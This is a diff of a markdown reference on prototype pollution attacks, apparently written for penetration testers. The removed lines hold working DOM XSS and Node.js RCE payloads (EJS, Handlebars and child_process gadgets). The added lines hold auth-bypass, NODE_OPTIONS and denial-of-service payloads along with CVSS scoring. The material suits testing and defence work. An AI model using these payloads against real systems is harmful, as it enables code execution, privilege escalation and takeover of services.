@@ -1,94 +1,88 @@
-# Prototype Pollution: Client-Side DOM XSS & Server-Side RCE
+# Prototype Pollution: Complete Reference
 
 ## Detection
 
-### Client-Side (Browser)
-```bash
-# URL parameter fuzzing
-https://target.com/page?__proto__[test]=polluted
-# Then check in console:
-Object.prototype.test === "polluted"
-# Or:
-({}).test === "polluted"
+### Common Polluted Properties
+```javascript
+// Server-side (Node.js)
+__proto__
+constructor.prototype
+__proto__.isAdmin
+constructor.prototype.isAdmin
+
+// Payload patterns
+{"__proto__": {"isAdmin": true}}
+{"constructor": {"prototype": {"isAdmin": true}}}
+{"__proto__": {"shell": "node"}}
 ```
 
-### Server-Side (JSON Body)
-```http
-POST /api/update-profile HTTP/1.1
-Content-Type: application/json
+### Vulnerable Operations
+```javascript
+// Object.assign
+Object.assign({}, userInput)
 
-{"__proto__":{"status":555},"name":"test"}
-```
-Check if error responses return `status:555` instead of expected codes.
+// Lodash merge
+_.merge({}, userInput)
 
-## Client-Side Exploitation
+// jQuery extend
+$.extend(true, {}, userInput)
 
-### Source Discovery
-Look for vulnerable merge/clone patterns in JS:
-```js
-// Unsafe merge
-$.extend(true, target, source);  // jQuery
-_.merge(target, source);          // Lodash
-Object.assign(target, source);    // Native (shallow)
-```
+// Express body parsers
+app.use(express.json())
+app.use(bodyParser.json())
 
-### Gadget Hunting
-Search for patterns that read from undefined properties:
-```js
-// Gadgets that read from prototype chain
-element.innerHTML = options.template;
-document.write(config.html);
-eval(settings.callback);
-location.href = opts.redirectUrl;
+// Spread operator merge
+{...userInput}
 ```
 
-### DOM XSS Chain
-```bash
-# 1. Pollute through URL
-https://target.com/app#__proto__[innerHTML]=<img src=x onerror=alert(document.domain)>
+### Detection Payloads
+```javascript
+// Server crashes or shows different behavior
+{"__proto__": {"a": "b"}}
 
-# 2. App reads: container.innerHTML = config.innerHtml || 'default'
-# 3. config.innerHtml is undefined → reads from polluted prototype → XSS fires
+// Check if prototype was modified
+console.log({}.a)  // "b" if vulnerable
+
+// DoS detection
+{"__proto__": {"toString": "polluted"}}
 ```
 
-## Server-Side Exploitation (Node.js RCE)
+## Exploitation
 
-### EJS Template Engine
-```http
-POST /api/settings
-{"__proto__":{"outputFunctionName":"x=process.mainModule.require('child_process').execSync('id').toString();s"}}
-```
-Then trigger any EJS template render → RCE.
+### RCE (Node.js)
+```javascript
+// Pollute to bypass shell checks
+{"__proto__": {"shell": "node", "env": "production"}}
 
-### Handlebars Engine
-```json
-{"__proto__":{"type":"Program","body":[{"type":"MustacheStatement","path":{"type":"PathExpression","parts":["constructor"]},"params":[{"type":"PathExpression","parts":["process","mainModule","require","child_process","execSync"]}]}]}}
-```
+// Pollute child_process options
+{"__proto__": {"NODE_OPTIONS": "--require /tmp/evil.js"}}
 
-### child_process Module
-```json
-{"__proto__":{"shell":"/bin/bash","NODE_OPTIONS":"--eval=require('child_process').execSync('id')"}}
+// Debugger injection
+{"__proto__": {"NODE_DEBUG": "child_process"}}
 ```
 
-### Express Config Gadgets
-```json
-{"__proto__":{"status":555}}
-// Confirms pollution via observable status code change
+### Auth Bypass
+```javascript
+// Pollute isAdmin to true
+// Server code: if (user.isAdmin)
+// After pollution: {}.isAdmin === true
+
+{"__proto__": {"isAdmin": true}}
+{"__proto__": {"role": "admin"}}
+{"__proto__": {"authenticated": true}}
 ```
 
-## Tools
-
-```bash
-# PPScan - automated detection
-ppscan -u "https://target.com/?__proto__[test]=polluted"
-# Server-Side Prototype Pollution Scanner (Burp extension)
-# ppmap - prototype pollution scanner
+### Denial of Service
+```javascript
+// Override built-in methods
+{"__proto__": {"toString": "bad"}}
+{"__proto__": {"hasOwnProperty": "bad"}}
+// Any code using these methods will crash
 ```
 
-## Reporting Notes
-
-Always chain prototype pollution to demonstrated impact:
-- Client-side: pollution-only = Medium. Polluted to XSS = High/Critical.
-- Server-side: pollution-only = Medium. Pollution to RCE = Critical.
-
-Show the chain: pollution source → gadget → sink execution.
+## CVSS Scoring
+| Scenario | CVSS | Criteria |
+|----------|------|---------|
+| Prototype pollution -> RCE | 9.8 | Network, Low, No auth, Full impact |
+| Prototype pollution -> auth bypass | 8.1 | Network, Low, No auth, All high |
+| Prototype pollution -> DoS | 7.5 | Network, Low, No auth, Availability high |
